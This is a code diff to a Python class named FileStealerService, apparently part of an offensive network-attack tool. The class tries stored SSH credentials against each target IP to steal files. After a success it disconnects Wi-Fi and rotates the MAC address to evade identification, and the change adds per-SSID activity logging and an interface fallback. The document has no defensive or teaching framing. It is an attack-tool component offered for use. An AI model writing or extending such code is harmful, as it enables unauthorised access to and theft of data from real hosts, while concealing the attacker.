@@ -23,10 +23,15 @@ class FileStealerService:
         self.logger.log(f"[INFO] Loaded {len(creds)} SSH credential(s).")
         return creds
 
-    def steal(self, targets):
+    def steal(self, targets, ssid="unknown"):
         succeeded = []
         for t in targets:
             ip = t["ip"]
+            self.logger.activity(
+                "file_steal", ssid,
+                f"Attempting file steal on {ip}...",
+                status="running"
+            )
             for cred in self.creds:
                 ok = self.stealer.steal_files(
                     target_ip=ip,
@@ -36,11 +41,25 @@ class FileStealerService:
                 )
                 if ok:
                     succeeded.append(ip)
-                    # per-host MAC rotate on success
                     self.logger.log(f"[SUCCESS] File stealing successful for IP: {ip}. Rotating MAC.")
+                    self.logger.activity(
+                        "file_steal", ssid,
+                        f"Files stolen from {ip}",
+                        status="success",
+                        details={"ip": ip}
+                    )
+                    # Use the active interface — fall back to wlan0 if unset
+                    iface = getattr(self.wifi_service.manager, "interface", "wlan0") or "wlan0"
                     self.wifi_service.disconnect()
-                    self.wifi_service.change_mac()
+                    self.wifi_service.change_mac(interface=iface)
                     time.sleep(1)
                     break
+            else:
+                self.logger.activity(
+                    "file_steal", ssid,
+                    f"No files stolen from {ip}",
+                    status="error"
+                )
+
         self.logger.log(f"[INFO] File stealing succeeded on {len(succeeded)} host(s).")
         return succeeded
